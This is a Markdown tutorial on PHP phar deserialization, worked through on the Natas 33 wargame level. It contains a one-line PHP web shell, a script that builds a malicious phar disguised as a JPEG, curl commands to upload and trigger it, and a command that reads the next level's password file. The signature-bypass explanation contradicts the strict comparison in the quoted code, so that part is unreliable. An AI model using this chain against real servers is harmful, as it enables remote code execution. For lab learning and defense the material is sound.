# 🌐 Web Security — Phar Deserialization

> In PHP, when the phar:// stream wrapper opens a .phar file,
> it automatically unserializes the serialized metadata inside it.
> This leads to RCE in combination with file upload + LFI.

---

## 📋 Table of Contents

- [What Is Phar?](#what-is-phar)
- [The phar:// Stream Wrapper](#the-phar-stream-wrapper)
- [Phar Metadata Deserialization](#phar-metadata-deserialization)
- [MD5 Signature Bypass](#md5-signature-bypass)
- [Usage in Natas](#usage-in-natas)

---

## What Is Phar?

**Phar (PHP Archive)** is a package format for PHP, like JAR. It collects multiple PHP files into a single `.phar` file.

```
phar file:
  ├── stub          (PHP code — the beginning)
  ├── manifest      (file list + metadata)
  ├── contents      (file contents)
  └── signature     (integrity signature — MD5/SHA)
```

---

## The phar:// Stream Wrapper

In PHP, the `phar://` stream wrapper is used to access files inside a phar file:

```php
include('phar://archive.phar/file.php');
file_get_contents('phar://archive.phar/data.txt');
```

### Critical Feature

When a file is accessed via `phar://`, PHP reads the phar manifest. The manifest can store **serialized PHP objects**, and these are **automatically unserialized** — even without a call to `unserialize()`!

```
phar:// → read the manifest → unserialize(metadata) → __wakeup() / __destruct() triggered
```

This can be triggered by **any file function** like `file_exists()`, `is_file()`, `file_get_contents()`, `include()`.

---

## Phar Metadata Deserialization

### Creating a Malicious Phar

```php
<?php
class SomeClass {
    public $cmd;
    function __destruct() {
        system($this->cmd);   // dangerous magic method
    }
}

// Create a malicious object
$obj = new SomeClass();
$obj->cmd = "cat /etc/natas_webpass/natas34";

// Create the phar
$phar = new Phar("evil.phar");
$phar->startBuffering();
$phar->addFromString("test.txt", "dummy content");
$phar->setStub("<?php __HALT_COMPILER(); ?>");
$phar->setMetadata($obj);    // ← write the malicious object into the metadata
$phar->stopBuffering();
?>
```

When this script is run, `evil.phar` is created. The `SomeClass` object is stored serialized in its metadata.

When `phar://evil.phar/test.txt` is opened on the server → the metadata is unserialized → `__destruct()` → the command runs.

---

## MD5 Signature Bypass

In Natas 33, the phar file's MD5 signature is checked. In PHP, the signature is usually verified like this:

```php
// Read the signature from the file, compare with the computed one
$signature = md5_file($uploaded_file);
if ($signature !== $expected) {
    die("Invalid signature!");
}
```

But in Natas 33, the `$signature` variable:

```php
class Executor {
    private $filename;
    private $signature = True;    // ← True!
    private $init = False;
}
```

`$signature = True` → `True == md5(...)` → PHP loose comparison:

```php
True == "anystring"   // true!  (non-empty string → truthy)
```

So the signature check is `True == [any_md5]` → always true → bypass!

---

## Usage in Natas

### Natas 33 — Phar Deserialization + Signature Bypass

**Source code (summary):**

```php
class Executor {
    private $filename = "default.php";
    private $signature = True;
    private $init = False;

    function __construct() {
        $this->init = True;
    }

    function __destruct() {
        if ($this->init) {
            if (file_exists($this->filename)) {
                if ($this->signature === md5(file_get_contents($this->filename))) {
                    include($this->filename);
                }
            }
        }
    }
}

if(isset($_POST['filename'])) {
    $e = new Executor();
    $e->filename = $_POST['filename'];
    // Save the file
    file_put_contents($uploaded_file, file_get_contents("php://input"));
}
```

**Analysis:**

1. `$signature = True` → the signature check always passes (loose comparison)
2. `__destruct()` → `include($this->filename)` → include a web shell via phar://
3. There's a file upload → we can upload a malicious phar

**Exploit Steps:**

**Step 1: Prepare the web shell**

```bash
echo '<?php passthru($_GET["cmd"]); ?>' > shell.php
```

**Step 2: Upload the web shell**

```bash
curl -u natas33:[password] \
     -X POST \
     --data-binary @shell.php \
     "http://natas33.natas.labs.overthewire.org/index.php?filename=shell.php"
```

**Step 3: Create the malicious phar**

```php
<?php
class Executor {
    private $filename = "shell.php";
    private $signature = True;
    private $init = True;
}

$obj = new Executor();

$phar = new Phar("evil.phar");
$phar->startBuffering();
$phar->addFromString("test.txt", "test");
$phar->setStub("<?php __HALT_COMPILER(); ?>");
$phar->setMetadata($obj);
$phar->stopBuffering();
rename("evil.phar", "evil.jpg");   // upload as jpg
?>
```

```bash
php create_phar.php
```

**Step 4: Upload the phar file**

```bash
curl -u natas33:[password] \
     -X POST \
     --data-binary @evil.jpg \
     "http://natas33.natas.labs.overthewire.org/index.php?filename=evil.jpg"
```

**Step 5: Trigger it via phar://**

```bash
curl -u natas33:[password] \
     -X POST \
     -d "filename=phar://evil.jpg/test.txt" \
     "http://natas33.natas.labs.overthewire.org/index.php"
```

`phar://evil.jpg/test.txt` → the phar is opened → the metadata is unserialized → `__destruct()` → `include("shell.php")` → the shell runs.

**Step 6: Run the command**

```bash
curl -u natas33:[password] \
     "http://natas33.natas.labs.overthewire.org/shell.php?cmd=cat+/etc/natas_webpass/natas34"
```

---

### Phar Deserialization — Checklist

```
Detection:
  ☐ Is there a file upload + file handling?
  ☐ Are functions like file_exists(), is_file(), include() called with user input?
  ☐ Even without unserialize(), phar:// can trigger it

Exploit:
  ☐ Find the __destruct or __wakeup of the target class
  ☐ Embed the malicious object into the metadata → create a Phar
  ☐ Upload the phar file with a different extension (.jpg, .png)
  ☐ Trigger it with the phar:// stream wrapper
  ☐ If $signature = True, bypass the signature check

To create a PHP Phar:
  ☐ phar.readonly = Off must be set in php.ini
  ☐ Create it with php create_phar.php
```

---

## 🔗 Resources

- [PortSwigger — Phar Deserialization](https://portswigger.net/web-security/deserialization/exploiting)
- [Secarma — File Upload to RCE via Phar](https://secarma.com/using-phar-archives-to-bypass-file-type-restrictions/)
- [PHP — Phar Stream Wrapper](https://www.php.net/manual/en/phar.using.intro.php)
- [BlackHat 2018 — Phar Deserialization](https://i.blackhat.com/us-18/Thu-August-9/us-18-Thomas-Its-A-PHP-Unserialization-Vulnerability-Jim-But-Not-As-We-Know-It.pdf)

---

**Previous topic:** [23_log_poisoning.md](./23_log_poisoning.md)

*This guide is part of the [waitaseC137/linux_learning](https://github.com/waitaseC137/linux_learning) repository.*
